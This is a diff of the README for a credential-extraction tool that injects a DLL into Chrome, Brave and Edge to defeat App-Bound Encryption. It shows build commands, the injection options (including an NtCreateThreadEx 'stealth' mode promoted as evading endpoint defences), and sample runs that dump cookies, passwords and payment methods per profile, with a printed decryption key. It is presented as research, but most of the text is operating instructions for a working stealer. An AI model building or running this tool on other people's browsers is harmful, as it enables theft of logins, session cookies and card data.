@@ -29,7 +29,7 @@ These path-validation checks prevent any external tool — even with direct DPAP
 
 For a comprehensive understanding of Chrome's App-Bound Encryption, the intricacies of its implementation, the detailed mechanics of this tool's approach, and a broader discussion of related security vectors, please refer to my detailed research paper:
 
-1.  ➡️ **[Chrome App-Bound Encryption (ABE) - Technical Deep Dive & Research Notes](RESEARCH.md)**
+1.  ➡️ **[Chrome App-Bound Encryption (ABE) - Technical Deep Dive & Research Notes](docs/RESEARCH.md)**
 
     This document covers:
     * The evolution from DPAPI to ABE.
@@ -38,14 +38,15 @@ For a comprehensive understanding of Chrome's App-Bound Encryption, the intricac
     * Analysis of encrypted data structures and relevant Chromium source code insights.
     * Discussion of alternative decryption vectors and Chrome's evolving defenses.
 
-2.  ➡️ **[The Curious Case of the Cantankerous COM: Decrypting Microsoft Edge's App-Bound Encryption](The_Curious_Case_of_the_Cantankerous_COM_Decrypting_Microsoft_Edge_ABE.md)**
+2.  ➡️ **[The Curious Case of the Cantankerous COM: Decrypting Microsoft Edge's App-Bound Encryption](docs/The_Curious_Case_of_the_Cantankerous_COM_Decrypting_Microsoft_Edge_ABE.md)**
+
     This article details the specific challenges and reverse engineering journey undertaken to achieve reliable ABE decryption for Microsoft Edge. It includes:
     *   An account of the initial issues and misleading error codes (`E_INVALIDARG`, `E_NOINTERFACE`).
     *   The process of using COM type library introspection (with Python `comtypes`) to uncover Edge's unique `IElevatorEdge` vtable structure and inheritance.
     *   How this insight led to tailored C++ interface stubs for successful interaction with Edge's ABE service.
     *   A practical look at debugging tricky COM interoperability issues.
 
-3.  ➡️ **[COMrade ABE: Your Field Manual for App-Bound Encryption's COM Underbelly](COMrade_ABE_Field_Manual.md)**
+3.  ➡️ **[COMrade ABE: Your Field Manual for App-Bound Encryption's COM Underbelly](docs/COMrade_ABE_Field_Manual.md)**
 
     This field manual introduces **COMrade ABE**, a Python-based dynamic analyzer for ABE COM interfaces, and dives into its practical applications:
     *   Explains the necessity for dynamic COM interface analysis due to browser variations and updates.
@@ -57,6 +58,8 @@ For a comprehensive understanding of Chrome's App-Bound Encryption, the intricac
 ### ⚙️ Key Features
 
 - 🔓 Full user-mode decryption & JSON export of cookies, passwords & payment methods
+- 📁 Customizable output directory for extracted data (`.\output\` by default)
+- 👥 Support for multiple browser profiles (Default, Profile 1, Profile 2, etc.)
 - 🚧 Stealth DLL injection to bypass path checks & common endpoint defenses
 - 🌐 Works on **Google Chrome**, **Brave** & **Edge** (x64 & ARM64)
 - 🛠️ No admin privileges required
@@ -68,9 +71,9 @@ For a comprehensive understanding of Chrome's App-Bound Encryption, the intricac
 
 | Browser            | Tested Version (x64 & ARM64) |
 | ------------------ | ---------------------------- |
-| **Google Chrome**  | 136.0.7103.93                |
-| **Brave**          | 1.78.97 (136.0.7103.93)      |
-| **Microsoft Edge** | 136.0.3240.64                |
+| **Google Chrome**  | 137.0.7151.41                |
+| **Brave**          | 1.78.102 (136.0.7103.113)    |
+| **Microsoft Edge** | 137.0.3296.39                |
 
 > [!NOTE]  
 > The injector requires the target browser to be **running** unless you use `--start-browser`.
@@ -81,30 +84,39 @@ For a comprehensive understanding of Chrome's App-Bound Encryption, the intricac
 
 2. **Prepare SQLite Amalgamation**
 
-   1. Download the [SQLite “autoconf” amalgamation](https://www.sqlite.org/download.html) and place `sqlite3.c` and `sqlite3.h` into your project root.
+   1. The [SQLite “autoconf” amalgamation](https://www.sqlite.org/download.html) source files (`sqlite3.c`, `sqlite3.h`) are included in the `libs/sqlite/` directory.
 
-   2. In a **Developer Command Prompt for VS** run:
+   2. In a **Developer Command Prompt for VS** (ensure you're in the project root):
 
    ```bash
-   cl /nologo /W3 /O2 /MT /c sqlite3.c
-   lib /nologo /OUT:sqlite3.lib sqlite3.obj
+   cl /nologo /W3 /O2 /MT /c libs\sqlite\sqlite3.c /Folibs\sqlite\sqlite3.obj
+   lib /nologo /OUT:libs\sqlite\sqlite3.lib libs\sqlite\sqlite3.obj
    ```
 
-   This produces a `sqlite3.lib` you can link into the DLL.
+   This produces `libs\sqlite\sqlite3.lib` which will be linked into the DLL.
 
 3. **Compile the DLL** (responsible for the decryption logic):
 
    ```bash
-   cl /EHsc /std:c++17 /LD /O2 /MT chrome_decrypt.cpp sqlite3.lib bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
+  cl /EHsc /std:c++17 /LD /O2 /MT /Ilibs\sqlite src\chrome_decrypt.cpp libs\sqlite\sqlite3.lib bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
    ```
 
 4. **Compile the injector** (responsible for DLL injection & console UX):
 
    ```bash
-   cl /EHsc /O2 /std:c++17 /MT chrome_inject.cpp version.lib ntdll.lib shell32.lib /link /OUT:chrome_inject.exe
+   cl /EHsc /O2 /std:c++17 /MT src\chrome_inject.cpp version.lib ntdll.lib shell32.lib /link /OUT:chrome_inject.exe
    ```
 
 Both artifacts (`chrome_inject.exe`, `chrome_decrypt.dll`) must reside in the same folder.
+
+###  automating Builds with GitHub Actions
+
+This project uses GitHub Actions to automatically build `chrome_inject.exe` and `chrome_decrypt.dll` for both **x64** and **ARM64** architectures.
+
+- **Continuous Integration:** Builds are triggered on every push to the `main` branch.
+- **Releases:** When a new version tag (e.g., `v0.9.0`) is pushed, the workflow automatically creates a GitHub Release. This release will include ZIP archives containing the compiled x64 and ARM64 binaries (`chrome-decryptor-VERSION-x64.zip` and `chrome-decryptor-VERSION-arm64.zip`).
+
+You can find pre-compiled binaries attached to the [Releases page](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases) of this repository.
 
 ## 🚀 Usage
 
@@ -116,17 +128,25 @@ PS> .\chrome_inject.exe [options] <chrome|brave|edge>
 
 Options
 
-- `--method load|nt`
+- `--method <load|nt>` or `-m <load|nt>`
   Injection method:
 
-  - load = CreateRemoteThread + LoadLibrary (default)
-  - nt = NtCreateThreadEx stealth injection
+ - `load`: CreateRemoteThread + LoadLibrary (default)
+ - `nt`: NtCreateThreadEx stealth injection
 
-- `--start-browser`
+`--start-browser` or `-s`
   Auto-launch the browser if it’s not already running.
 
-- `--verbose`
-  Enable extensive debugging output.
+- `--output-path <path>` or `-o <path>`
+  Specifies the base directory for output files.
+  Defaults to `.\output\` relative to the injector's location.
+  Data will be organized into subfolders: `<path>/<BrowserName>/<ProfileName>/`.
+
+- `--verbose` or `-v`
+  Enable extensive debugging output from the injector.
+
+- `--help` or `-h`
+  Show this help message.
 
 ### Examples
 
@@ -144,34 +164,38 @@ PS> .\chrome_inject.exe --method load --start-browser --verbose brave
 #### Normal Run
 
 ```bash
-PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --method nt
+PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption>chrome_inject.exe chrome --start-browser
 ------------------------------------------------
 |  Chrome App-Bound Encryption Decryption      |
 |  Multi-Method Process Injector               |
 |  Cookies / Passwords / Payment Methods       |
-|  v0.8.0 by @xaitax                           |
+|  v0.9.0 by @xaitax                           |
 ------------------------------------------------
 
 [*] Chrome not running, launching...
-[+] Chrome (v. 136.0.7103.93) launched w/ PID 17576
-[+] DLL injected via NtCreateThreadEx stealth
+[+] Chrome (v. 137.0.7151.41) launched w/ PID 4240
+[+] DLL injected via CreateRemoteThread + LoadLibraryA
 [*] Waiting for DLL decryption tasks to complete (max 60s)...
 [+] DLL signaled completion.
 
 [+] COM library initialized (APARTMENTTHREADED).
-[+] IElevator instance created for Chrome.
-[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING).
-[+] Attempting to read Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
-[+] Finished Base64 decoding with API (1224 bytes).
+[+] Attempting to read Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
 [+] Encrypted key header is valid.
 [+] Encrypted key blob from Local State (1220 bytes).
 [+] Encrypted key (preview): 01000000d08c9ddf0115d1118c7a00c0...
+[+] IElevator instance created for Chrome.
+[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING) for Chrome.
 [+] IElevator -> DecryptData successful. Decrypted key length: 32
 [+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
 [+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
-[*] 8 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
-[*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
-[*] 1 Payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
+[*] Found profile: Default
+[*] Found profile: Profile 1
+[*] Processing profile: Default at path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Default
+     [*] 9 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.txt
+     [*] 1 Passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.txt
+     [*] 1 Payment methods extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\payments.txt
+[*] Processing profile: Profile 1 at path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Profile 1
+     [*] 31 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
 [*] Chrome data decryption process finished for Chrome.
 [*] Unloading DLL and exiting worker thread.
 [*] Chrome terminated by injector.
@@ -180,93 +204,103 @@ PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome
 #### Verbose
 
 ```bash
-PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --method nt --verbose
+PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --verbose
 ------------------------------------------------
 |  Chrome App-Bound Encryption Decryption      |
 |  Multi-Method Process Injector               |
 |  Cookies / Passwords / Payment Methods       |
-|  v0.8.0 by @xaitax                           |
+|  v0.9.0 by @xaitax                           |
 ------------------------------------------------
 
 [#] Verbose mode enabled.
 [#] CleanupPreviousRun: attempting to remove temp files
 [#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
 [#] Deleting C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
-[#] HandleGuard: acquired handle 188
+[#] Resolved output path: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
+[#] Writing session config to: C:\Users\ah\AppData\Local\Temp\chrome_decrypt_session.cfg
+[#] HandleGuard: acquired handle 0xbc (CompletionEvent)
 [#] Created completion event: Global\ChromeDecryptWorkDoneEvent
 [#] Target: Chrome, Process: chrome.exe, Default Exe: C:\Program Files\Google\Chrome\Application\chrome.exe
 [#] GetProcessIdByName: snapshotting processes for chrome.exe
-[#] HandleGuard: acquired handle 180
+[#] HandleGuard: acquired handle 0xa8 (CreateToolhelp32Snapshot)
 [#] GetProcessIdByName: Process chrome.exe not found.
-[#] HandleGuard: closing handle 180
+[#] HandleGuard: closing handle 0xa8 (CreateToolhelp32Snapshot)
 [*] Chrome not running, launching...
 [#] StartBrowserAndWait: attempting to launch: C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] HandleGuard: acquired handle 224
-[#] HandleGuard: acquired handle 220
-[#] Browser main thread handle: 220
-[#] Browser process handle: 224
+[#] HandleGuard: acquired handle 0xdc (BrowserProcessHandle)
+[#] HandleGuard: acquired handle 0xd8 (BrowserMainThreadHandle)
 [#] Waiting 3s for browser to initialize...
-[#] Browser started PID=6512
-[#] HandleGuard: closing handle 220
-[#] HandleGuard: closing handle 224
+[#] Browser started PID=18868
+[#] HandleGuard: closing handle 0xd8 (BrowserMainThreadHandle)
+[#] HandleGuard: closing handle 0xdc (BrowserProcessHandle)
 [#] Retrieving version info for: C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] Version query successful: 136.0.7103.93
-[+] Chrome (v. 136.0.7103.93) launched w/ PID 6512
-[#] Opening process PID=6512
-[#] HandleGuard: acquired handle 220
+[#] Version query successful: 137.0.7151.41
+[+] Chrome (v. 137.0.7151.41) launched w/ PID 18868
+[#] Opening process PID=18868
+[#] HandleGuard: acquired handle 0xdc (TargetProcessHandle)
 [#] IsWow64Process2: processMachine=Unknown, nativeMachine=ARM64, effectiveArch=ARM64
 [#] Architecture match: Injector=ARM64, Target=ARM64
-[#] GetDllPath: DLL path determined as: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
-[#] DLL path: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
-[#] InjectWithNtCreateThreadEx: begin for DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
-[#] ntdll.dll base=140716223889408
-[#] NtCreateThreadEx addr=140716223896768
-[#] VirtualAllocEx size=87
-[#] WriteProcessMemory complete for DLL path to remote address: 2670231552000
-[#] Calling NtCreateThreadEx with LoadLibraryA at 140716207975648
-[#] HandleGuard: acquired handle 224
-[#] NtCreateThreadEx returned status 0, thread handle=224
-[#] Waiting for remote LoadLibraryA thread (NtCreateThreadEx) to complete (max 15s)...
-[#] Remote LoadLibraryA thread (NtCreateThreadEx) finished.
-[#] InjectWithNtCreateThreadEx: done
-[#] HandleGuard: closing handle 224
-[+] DLL injected via NtCreateThreadEx stealth
+[#] GetDllPathUtf8: DLL path determined as: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
+[#] InjectWithLoadLibrary: begin for DLL: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
+[#] WriteProcessMemory of DLL path (87 bytes) to remote address: 0x1c8852b0000
+[#] Calling CreateRemoteThread with LoadLibraryA at 0x7ffcba442ce0
+[#] HandleGuard: acquired handle 0xf4 (RemoteLoadLibraryThread)
+[#] Waiting for remote LoadLibraryA thread to complete (max 15s)...
+[#] Remote LoadLibraryA thread finished.
+[#] InjectWithLoadLibrary: done
+[#] HandleGuard: closing handle 0xf4 (RemoteLoadLibraryThread)
+[+] DLL injected via CreateRemoteThread + LoadLibraryA
 [*] Waiting for DLL decryption tasks to complete (max 60s)...
 [+] DLL signaled completion.
 [#] Attempting to display log file: C:\Users\ah\AppData\Local\Temp\chrome_decrypt.log
 
+[+] Terminated process: ID 21896 (chrome.exe)
+[+] Terminated process: ID 22320 (chrome.exe)
+[+] Terminated process: ID 19472 (chrome.exe)
+[+] Terminated process: ID 9576 (chrome.exe)
+[+] Terminated process: ID 7188 (chrome.exe)
+[+] Terminated process: ID 12244 (chrome.exe)
 [+] COM library initialized (APARTMENTTHREADED).
-[+] IElevator instance created for Chrome.
-[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING).
-[+] Attempting to read Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
-[+] Finished Base64 decoding with API (1224 bytes).
+[+] Attempting to read Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
 [+] Encrypted key header is valid.
 [+] Encrypted key blob from Local State (1220 bytes).
 [+] Encrypted key (preview): 01000000d08c9ddf0115d1118c7a00c0...
+[+] IElevator instance created for Chrome.
+[+] Proxy blanket set (PKT_PRIVACY, IMPERSONATE, DYNAMIC_CLOAKING) for Chrome.
 [+] IElevator -> DecryptData successful. Decrypted key length: 32
 [+] Decrypted AES key (hex) saved to: C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
 [+] Decrypted AES Key (hex): 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
-[*] 8 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
-[*] 1 Passwords extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_passwords.txt
-[*] 1 Payment methods extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_payments.txt
+[*] Found profile: Default
+[*] Found profile: Profile 1
+[*] Processing profile: Default at path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Default
+     [*] 9 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.txt
+     [*] 1 Passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.txt
+     [*] 1 Payment methods extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\payments.txt
+[*] Processing profile: Profile 1 at path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Profile 1
+     [*] 31 Cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.txt
 [*] Chrome data decryption process finished for Chrome.
 [*] Unloading DLL and exiting worker thread.
-[#] Terminating browser PID=6512 because injector started it.
-[#] HandleGuard: acquired handle 224
+[#] Terminating browser PID=18868 because injector started it.
+[#] HandleGuard: acquired handle 0xf0 (ProcessToKillHandle)
 [*] Chrome terminated by injector.
-[#] HandleGuard: closing handle 224
+[#] HandleGuard: closing handle 0xf0 (ProcessToKillHandle)
 [#] Injector finished.
-[#] HandleGuard: closing handle 220
-[#] HandleGuard: closing handle 188
+[#] HandleGuard: closing handle 0xdc (TargetProcessHandle)
+[#] HandleGuard: closing handle 0xbc (CompletionEvent)
 ```
 
 ## 📂 Data Extraction
 
-Once decryption completes, three JSON files are emitted into your Temp folder:
+Once decryption completes, data is saved to the specified output path (defaulting to `.\output\` if not specified via `--output-path`). Files are organized as follows:
 
-- 🍪 **Cookies:** `%TEMP%\<Browser>_decrypt_cookies.txt`
-- 🔑 **Passwords:** `%TEMP%\<Browser>_decrypt_passwords.txt`
-- 💳 **Payment Methods:** `%TEMP%\<Browser>_decrypt_payments.txt`
+**Base Path:** `YOUR_CHOSEN_PATH` (e.g., `.\output\` or the path you provide)
+**Structure:** <Base Path>/<BrowserName>/<ProfileName>/<data_type>.txt
+
+Example paths (assuming default output location):**
+
+- 🍪 **Cookies (Chrome Default profile):** .\output\Chrome\Default\cookies.txt
+- 🔑 **Passwords (Edge Profile 1):** .\output\Edge\Profile 1\passwords.txt
+- 💳 **Payment Methods (Brave Default profile):** .\output\Brave\Default\payments.txt
 
 ### 🍪 Cookie Extraction
 
@@ -364,6 +398,12 @@ Many of these relate to the conditions required for DPAPI to successfully operat
 *   Chrome has an internal recovery mechanism (`IElevator::RunRecoveryCRXElevated(...)`) that can re-wrap keys if DPAPI fails, but not implemented by this tool to avoid providing an easy bypass for malware.
 
 ## 🆕 Changelog
+
+### v0.9
+- **New**: Added `--output-path` (`-o`) argument to `chrome_inject.exe` for user-configurable output directory. Output files are now organized by BrowserName/ProfileName/data_type.txt.
+- **New**: Implemented support for automatically detecting and decrypting data from multiple browser profiles (e.g., Default, Profile 1, Profile 2).
+- **CI/CD**: Integrated GitHub Actions workflow for automated building of x64 and ARM64 binaries, and automatic release creation upon new version tags.
+- **Project Structure**: Reorganized the repository into src/, libs/, docs/, and tools/ directories for better maintainability.
 
 ### v0.8
 
